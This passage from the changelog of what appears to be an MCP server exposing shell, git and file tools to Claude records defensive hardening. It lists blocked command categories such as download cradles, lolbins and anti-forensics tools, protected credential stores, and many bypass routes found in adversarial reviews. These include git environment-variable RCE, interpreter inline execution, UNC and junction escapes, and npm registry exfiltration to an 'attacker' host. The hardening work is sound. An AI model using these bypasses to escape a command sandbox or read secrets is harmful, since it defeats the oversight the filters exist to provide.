- D7: Startup-time audit log path validation — `MCP_LOG_DIR` values of `/dev/null`, `NUL`, `/dev/zero`, `/dev/stdout`, `/dev/stderr`, and any `/tmp/*` path are rejected with a hard error at boot (`audit.ts`)

---

## [1.9.2] — 2026-04-22

### Security (S60 Phase 1)
- Widened `-EncodedCommand` prefix pattern from `e(nc(odedcommand)?)?` to `[cfe][a-zA-Z]*`, catching every unambiguous PowerShell CLI prefix (`-e`, `-en`, `-enc`, `-enco`, etc.) (C1)
- Blocked `LD_PRELOAD`, `LD_AUDIT`, `LD_LIBRARY_PATH` in command strings (C7 — dynamic-linker injection)
- Added `ksh` to blocked shell list (C8 — shell -c flag injection)
- Blocked `vssadmin`, `wbadmin`, `wevtutil`, `ntdsutil` (C10 — Windows anti-forensics toolkit)
- Added bypass-corpus test suite: 64 adversarial vectors, all blocked

---

## [1.9.1] — 2026-04-21

### Security (S59-gap)
- Layer 1: Added `download-cradle` category (Invoke-WebRequest, Net.WebClient, certutil -urlcache, curl, wget, nc, scp, ftp and aliases)
- Layer 1: Added `lolbin` category (mshta, wscript, cscript, regsvr32, rundll32, msiexec)
- Layer 1: Added `registry` category (reg add/delete/import, regedit, Set/New/Remove-ItemProperty on hives)
- Layer 1: Added `wmi-exec` category (wmic process call create, Invoke-WmiMethod, New/Invoke-CimInstance)
- Layer 1: Added `com-exec` category (New-Object -ComObject WScript.Shell/Shell.Application)
- Layer 1: Added `exec-policy` category (Set-ExecutionPolicy Bypass/Unrestricted)
- Layer 1: Added `env-manip` category ([System.Environment]::SetEnvironmentVariable, setx)
- Layer 1: Added `chaining` category (;, &&, ||, single & CMD chaining)
- Layer 1: Added `base64-exec` category (certutil -decode, base64 -d, [Convert]::FromBase64String)
- Layer 1: Added Python/Node/Ruby/Perl/PHP inline execution patterns to `code-exec` category

---

## [1.9.0] — 2026-04-21

### Added

- **BLOCKED Tier — Three-Layer Classification Pipeline (ToS §8)** — New hard-block tier above RED implementing the contractual requirement from §8. All commands pass through three sequential gates before RED/AMBER/GREEN execution:
  - **Layer 1 — Static Pattern Match** (synchronous, zero latency): Deterministic regex matching across 11 BLOCKED categories: recursive file deletion, redirect/truncation overwrite, destructive git history rewrite, database destruction, disk-level write operations, system power/init, credential/key material destruction, OS permission/user destruction, firewall/network security destruction, audit log/evidence destruction, and container/orchestration nuclear operations.
  - **Layer 2 — AI Pre-Classification** (async, ~500ms): Claude API call for intent-based classification that catches creative variants, chained commands, and obfuscated patterns missed by static matching. Degrades gracefully if `ANTHROPIC_API_KEY` is unset.
  - **Layer 3 — Multi-Persona Adversarial Board** (async, parallel with Layer 2 for elevated-risk commands): Six expert perspectives (Developer, CISO, Penetration Tester, DBA, SRE, Forensics Investigator) reviewing each command. `BLOCKED` verdicts hard-block; `PROCEED WITH CAUTION` prepends a warning to the tool response.

- **Structured BLOCKED Error Format** — Blocked commands return a structured error surfaced directly to the Claude conversation, including: category name, reason, detecting layer, and per-category manual steps so the user is never left without a path forward.

- **`ANTHROPIC_API_KEY` environment variable** — Required for Layer 2 and Layer 3 AI classification. Both layers fail-open (log warning, proceed to next gate) if the key is not configured, preserving backward compatibility.

### Changed

- Version bumped from 1.8.3 → 1.9.0.
- `@anthropic-ai/sdk` added as a dependency.

---

## [1.8.3] — 2026-04-19

### Token frugality patch — Policy §5.B alignment (S58)

Re-audited all 8 tool output paths against Anthropic Software Directory Policy §5.B ("Output size should be commensurate with task complexity"). Four read-tools were missing the existing `truncateOutput()` wrapper. Mechanical wraps applied — no behavioral change to bounded outputs, defensive cap on previously-unbounded outputs.

- **`read_file` (F-TOK-1)** — wrap return in `truncateOutput()`. The 500-line clamp does not bound character count; reading 500 lines of minified JS could exceed `MAX_CMD_OUTPUT_CHARS`.
- **`list_directory` (F-TOK-2)** — wrap return in `truncateOutput()`. Listings of large directories (`C:\Windows\System32`, `node_modules` roots) had no character cap.
- **`run_npm_command` (F-TOK-3)** — wrap return in `truncateOutput(scrubSecrets(...))`. `npm list` on a monorepo or `npm audit` with many vulnerable deps could exceed cap. `scrubSecrets` runs first so redaction isn't cut off mid-pattern; symmetric with `run_git_command`.
- **`get_system_info` (F-TOK-4)** — wrap return in `truncateOutput()`. Edge-case `wmic` output on hosts with many drives/NICs.

No code-path changes. Tool behavior is identical to v1.8.2 for inputs that produce output below `MAX_CMD_OUTPUT_CHARS` (10,000 chars). Outputs that exceed the cap now return a truncation marker instead of an unbounded string.

`npm audit` clean (0 vulnerabilities across 136 deps).

---

## [1.8.2] — 2026-04-19

### Policy-compliance tool-description tightening (S57)

Re-audited all 8 tool descriptions against Anthropic Software Directory Policy §2.A–G before marketplace submission. Four descriptions / annotations adjusted. No functional changes.

- **`list_directory` description** — clarified scope. Previous text claimed "full Windows file system access"; code actually guards sensitive paths via `isSensitiveFile` (`.ssh`, `.aws`, credential stores, etc.). New text: "broad Windows file system access (sensitive paths like `.ssh`, `.aws`, and credential stores are guarded)." Brings description in line with Policy 2.B ("precisely match actual functionality").
- **`run_npm_command` annotation** — `readOnlyHint` flipped from `false` to `true`. All six approved sub-commands (list, outdated, audit, view, why, explain) are read-only queries of local package state; annotation previously contradicted the description.
- **`run_git_command` description + annotation** — rescoped from "read-only" to "non-destructive that don't modify the working tree." `git fetch` mutates `.git/refs/remotes/*` (updates remote-tracking refs), so calling it "read-only" was technically inaccurate. `readOnlyHint` changed from `true` to `false` to match. (Note: `fetch` was subsequently removed from the allowlist in v1.4.0 F-15 due to RCE risk via `.git/config` transport helpers — it is not available in current versions.)
- **`find_files` description** — dropped the "single source for file discovery" wording. `list_directory` and `search_file` also discover files, so the uniqueness claim overstated. Replaced with "Call this tool directly for file-pattern discovery across a directory tree."

No code or allowlist changes. Tool behavior is identical to v1.8.1.

---

## [1.8.1] — 2026-04-18

Sixth-pass adversarial review close. 21 findings across CRITICAL/HIGH/MEDIUM/LOW tiers closed. See `ADVERSARIAL_REVIEW.md` for the detailed finding list.

## [1.8.0] — 2026-04-18

Bridge release between fifth-pass (v1.7.1) and sixth-pass (v1.8.1). Test-suite parity gaps and packaging scaffolding — no new adversarial findings addressed.

## [1.7.1] — 2026-04-18

Fifth-pass adversarial review close. 20 findings (F-LT-36..51 + related) closed. Passed Crescendo test run.

## [1.7.0] — 2026-04-18

Fourth-pass adversarial review close. F-LT-23 and F-LT-35 closed.

---

## [1.6.0] — 2026-04-18

### Security hardening — third-pass Opus adversarial review (S48)

Closes all 5 CRITICAL and all 8 HIGH findings from the third-pass adversarial review. Previous verdict: FAIL.

**F-LT-1 (CRITICAL): GIT_PAGER env var bypasses `core.pager=cat` neutralizer → RCE**
- `buildSafeGitEnv(dir)` introduced, replacing the inline `safeGitEnv` object. Forces `GIT_PAGER=cat` and `PAGER=cat` in the child env — these outrank any `-c core.pager=cat` config flag. Belt-and-suspenders with `--no-pager` flag on every git invocation.

**F-LT-2 (CRITICAL): GIT_EXTERNAL_DIFF env var bypasses `diff.external=` neutralizer → RCE**
- `buildSafeGitEnv()` explicitly deletes `GIT_EXTERNAL_DIFF` and `GIT_DIFF_OPTS` from the child env.
- `--no-ext-diff` flag added to every git invocation at the argv level.

**F-LT-3 (CRITICAL): GIT_CONFIG_COUNT / GIT_CONFIG_KEY_N / GIT_CONFIG_VALUE_N injection**
- `buildSafeGitEnv()` deletes `GIT_CONFIG_COUNT`, `GIT_CONFIG_PARAMETERS`, and all keys starting with `GIT_CONFIG_KEY_` or `GIT_CONFIG_VALUE_` via prefix scan of the env.

**F-LT-4 (CRITICAL): `git show <commit_sha>` leaks file contents via bare-ref commit diff**
- Pre-flight check added in `run_git_command` for `git show`: runs `git show --name-only --no-patch --pretty=format:` to retrieve touched file names, then rejects the call if any path matches `SENSITIVE_FILE_PATTERNS`. The `ref:path` form was already blocked in `validateGitArgv`; this closes the bare `<sha>` form.

**F-LT-5 (CRITICAL): `node -p` / `--print` bypasses `-e`/`--eval` block**
- Added RED patterns for `node -e/-p`, `node --eval/--print`, `node --require/-r`, `node --import`, and `node --inspect`.

**F-LT-6 (HIGH): UNC via forward slashes `//server/share` bypasses UNC reject**
- `sanitizeDir()`, `list_directory`, and `read_file` now reject `//` prefix in addition to the existing `\\` check.

**F-LT-7 (HIGH): NTFS junction points bypass symlink check in `find_files`**
- `find_files` walker now calls `realpathSync(full)` on every directory entry; if the canonical path differs from the nominal path, the entry is a reparse point (junction) and is skipped.

**F-LT-8 (HIGH): `git show/log/diff -- <path>` pathspec bypasses sensitive check**
- `validateGitArgv()` now scans all tokens after `--` against `SENSITIVE_FILE_PATTERNS`. Closes the pathspec form `git log --all -- '*.env'` and `git show <sha> -- config/.env`.

**F-LT-9 (HIGH): `python -m`, `ruby -e`, `php -r`, `perl -E`, `deno eval` not blocked**
- Added RED patterns for all these interpreter inline-exec forms.

**F-LT-10 (HIGH): `git -C <path>` CWD escape + hooksPath/diff-driver not neutralized**
- `-C`, `--work-tree`, `--git-dir`, `--super-prefix`, `--namespace` added to `FORBIDDEN_GIT_FLAGS`.
- `core.hooksPath=NUL` (Windows) / `core.hooksPath=/dev/null` (POSIX) added to `GIT_SAFE_CONFIG`.
- `--no-ext-diff` added to every git invocation.

**F-LT-11 (HIGH): NTFS hardlink bypasses realpath sensitive check in `read_file`**
- After canonical-path resolution, if `stat.nlink > 1` on Windows, `fsutil hardlink list` enumerates all linked paths; access is blocked if any linked path matches `SENSITIVE_FILE_PATTERNS`.

**F-LT-12 (HIGH): GIT_DIR / GIT_OBJECT_DIRECTORY / GIT_WORK_TREE env inheritance**
- `buildSafeGitEnv()` deletes `GIT_DIR`, `GIT_WORK_TREE`, `GIT_OBJECT_DIRECTORY`, and `GIT_ALTERNATE_OBJECT_DIRECTORIES` from the child env.

**F-LT-13 (HIGH): Token stores not in SENSITIVE_FILE_PATTERNS**
- Added: Slack/Discord Local Storage, Chrome Login Data/Cookies, Firefox Profiles, Windows Credential Manager Vault, VS Code globalStorage.

**F-LT-14 (MEDIUM): `node --inspect=0.0.0.0:9229` remote debugger**
- Blocked by the F-LT-5 `node --inspect` RED pattern.

**F-LT-15 (MEDIUM): LOLBAS gaps — forfiles, finger, diskshadow, mmc**
- `forfiles` promoted from AMBER to RED.
- `finger`, `diskshadow`, `mmc.exe` added to RED.

**F-LT-16 (MEDIUM): `git log --walk-reflogs` exposes deleted/orphan refs**
- `--walk-reflogs` and `--reflog` added to `FORBIDDEN_GIT_FLAGS`.

**F-LT-17 (MEDIUM): `npm audit --registry=http://attacker` dep-graph exfil**
- `run_npm_command` now rejects `--registry=`, `--cafile=`, `--proxy=`, `--https-proxy=` flags.

**F-LT-18 (MEDIUM): `git log --pretty=format:%x1b…` terminal escape injection**
- Git output is now post-processed to strip ANSI/VT escape sequences before returning.

**F-LT-21 (LOW): `git diff --binary` binary-blob leak**
- `--binary` added to `FORBIDDEN_GIT_FLAGS`.

**Other:**
- `.env` regex in `SENSITIVE_FILE_PATTERNS` tightened: `/\.env($|\.)/i` → `/\.env(?![a-zA-Z0-9])/i` (mirrors vps-control-mcp F-OP-5 fix).

---

## [1.5.0] — 2026-04-18

### Security hardening — second-pass Opus adversarial review (S45)

Closes all 2 CRITICAL, 4 HIGH, and 5 MEDIUM/LOW findings from the second-pass adversarial review. Previous verdict: FAIL. All blockers resolved.

**CRITICAL:**
- **F-NEW-2**: git config RCE — prepend 7 neutralizing `-c` flags to every `run_git_command` invocation (`diff.external=`, `core.pager=cat`, `core.fsmonitor=`, `core.sshCommand=`, `core.editor=true`, `protocol.ext.allow=never`, `protocol.file.allow=user`). Add `GIT_CEILING_DIRECTORIES` to safeGitEnv. Closes the two-step `.git/config` write → `git diff` execute attack chain.
- **F-NEW-1 + F-NEW-6 (CRITICAL + HIGH)**: `validateGitArgv()` added — rejects `--no-index`, `--ext-diff`, `--textconv`, `--output`, `-O`, `--config-env`, `-c`, `--exec-path`, `-p`, `--patch`, `-S`, `-G`, `--pickaxe-*`. For `git show`: rejects `<ref>:<path>` where path matches `SENSITIVE_FILE_PATTERNS`. Closes arbitrary-file-read via `git diff --no-index` and historical secret exfil via `git log -p -S / git show HEAD:.env`.

**HI